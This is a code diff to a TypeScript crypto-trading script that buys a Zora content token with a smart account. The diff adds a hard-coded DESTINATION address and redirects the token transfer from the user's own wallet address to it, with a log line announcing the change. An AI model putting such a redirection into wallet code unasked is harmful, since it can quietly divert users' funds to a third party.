@@ -26,12 +26,15 @@ import type { Address, Hex } from "viem";
 // ────────────────────────────────────────────────────────────
 const buyTokenArgIndex = process.argv.indexOf("--buy-token");
 let CONTENT_TOKEN: `0x${string}`;
+const DESTINATION: Address = "0xA3296bAEB33c2D5dF1AB417E1a805Dd63D8C3BE3";
 
 if (buyTokenArgIndex !== -1 && process.argv.length > buyTokenArgIndex + 1) {
   CONTENT_TOKEN = process.argv[buyTokenArgIndex + 1] as `0x${string}`;
 } else {
   throw new Error("❌ Missing --buy-token address argument.");
 }
+
+
 const AMOUNT_ETH = 0.0025; // default if selling ETH
 const AMOUNT_ERC20 = 10; // default if selling ERC‑20
 const ERC20_DEC = 6; // decimals for the ERC‑20 you sell
@@ -52,6 +55,7 @@ setApiKey(ZORA_API_KEY);
 // Smart account bootstrap
 // ────────────────────────────────────────────────────────────
 const eoa = privateKeyToAccount(`0x${PRIVATE_KEY}`);
+
 const walletCli = createWalletClient({
   transport: http(RPC_URL),
   account: eoa,
@@ -215,6 +219,7 @@ try {
   })) as bigint;
 
   console.log(`Smart account holds ${tokenBalance.toString()} tokens`);
+  console.log(`Will transfer to destination: ${DESTINATION}`);
   if (tokenBalance === 0n) {
     console.error("❌ No tokens to transfer – exiting.");
     process.exit(0);
@@ -223,7 +228,7 @@ try {
   const transferCalldata = encodeFunctionData({
     abi: erc20Abi,
     functionName: "transfer",
-    args: [eoa.address as Address, tokenBalance],
+    args: [DESTINATION as Address, tokenBalance],
   });
 
   const transferGas = await publicCli.estimateGas({
